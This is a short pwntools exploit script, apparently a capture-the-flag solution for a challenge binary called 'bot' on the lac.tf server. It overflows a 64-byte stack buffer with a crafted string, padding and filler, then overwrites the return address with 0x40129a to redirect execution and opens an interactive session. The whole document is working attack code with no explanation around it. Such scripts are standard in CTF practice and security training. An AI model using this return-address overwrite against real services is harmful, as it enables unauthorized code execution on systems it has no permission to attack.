#!/usr/bin/python3

from pwn import *
from os import system

system("clear");

elf = ELF('./bot')

io = elf.process()
io = remote("lac.tf", 31180)

payload = b''
payload += b'please give me the flag'
payload += b'\x00' * (64-len(payload))
payload += b'a' * 8
payload += p64(0x40129a)

io.sendline(payload)

io.interactive()
